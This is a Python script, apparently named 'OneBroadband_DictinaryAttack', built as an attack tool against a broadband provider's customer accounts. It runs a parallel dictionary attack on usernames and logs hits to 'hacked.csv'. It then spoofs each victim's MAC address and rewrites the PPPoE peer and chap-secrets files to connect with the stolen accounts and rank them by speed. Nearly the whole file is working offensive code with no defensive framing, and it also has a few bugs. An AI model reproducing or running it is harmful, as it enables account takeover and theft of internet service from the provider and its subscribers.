import os
from ob_request import User
from helper import *
import multiprocessing as mp
from tqdm import *
import time
import speedtest
from datetime import datetime

TESTED = []
dsl = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser "{}"\nusepeerdns'


def init(args):
    global TESTED
    TESTED = args


def attack(username):
    if username not in TESTED:
        try:
            user = User(username.replace('\n', ''))
            user.execute()
            if user:
                write('hacked.csv', str(user))
            write('tested.txt', username)
        except:
            pass


def generate_username():
    dict_path = input('Enter the dictionary filepath: ')

    if os.path.isfile(dict_path):
        global TESTED
        TESTED = list(open('tested.txt', 'r'))
        usernames = list(open(dict_path, 'r'))

        with mp.Pool(mp.cpu_count(), initializer=init, initargs=(TESTED,)) as p:
            with tqdm(total=len(usernames)) as pbar:
                for i, _ in enumerate(p.imap_unordered(attack, usernames)):
                    pbar.update()
    else:
        print('File not found')


def test_speed():
    s = speedtest.Speedtest()
    s.get_servers()
    s.get_best_server()
    s.download()
    res = s.results.dict()
    return '{:.2f} MB/s'.format(res["download"] / 8000000)


def get_speed(speed):
    speed = speed[:speed.index('Mbps')]
    temp = speed.rindex('_')
    speed = speed[speed.rindex('_') + 1:]
    return speed


def _sort(e):
    return e[2]


def test_username():
    dict_path = input('Enter the dictionary filepath: ')
    if os.path.isfile(dict_path):
        accounts = []
        for i in open('hacked.csv', 'r').readlines():
            try:
                acc = i.split(',')
                acc[2] = get_speed(acc[2])
                accounts.append(acc)
            except:
                pass

        accounts.sort(reverse=True, key=lambda x: x[2])

        for account in accounts:
            # account = i.split(',')
            print(str(account))
            os.system('poff -a')
            os.system('ifconfig eth0 down')
            os.system(f'macchanger -m {account[1]} eth0')
            os.system('ifconfig eth0 up')
            with open('/etc/ppp/peers/dsl-provider', 'w') as f:
                f.write(dsl.format(account[0]))
            with open('/etc/ppp/chap-secrets', 'w') as f:
                f.write(f'"{account[0]}" * "1234"')
            os.system('pon dsl-provider')
            time.sleep(15)

            retry = 5

            connected = False
            connected_account: str
            while connected != True & retry > 0:
                try:
                    speed = test_speed()
                    write(
                        f'/home/pi/OneBroadband_DictinaryAttack/succesfull{datetime.today().strftime("%Y-%m-%d")}.csv',
                        f'{i[:-1]},{speed}\n')
                    connected = True
                    print(f'{account[0]} {speed}')
                except Exception as e:
                    time.sleep(10)
                    retry = retry - 1
                    print(e)


def switch_connection():
    print('switch')


MENU = {
    1: generate_username,
    2: test_username,
    3: switch_connection,
    4: exit
}

if __name__ == '__main__':
    print('============================================')
    print('1.Generate username list')
    print('2.Test username')
    print('3.Switch username')
    print('4.Exit')
    print('============================================')
    MENU.get(int(input('\nSelect an options : ')), lambda: 'Invalid option selected')()
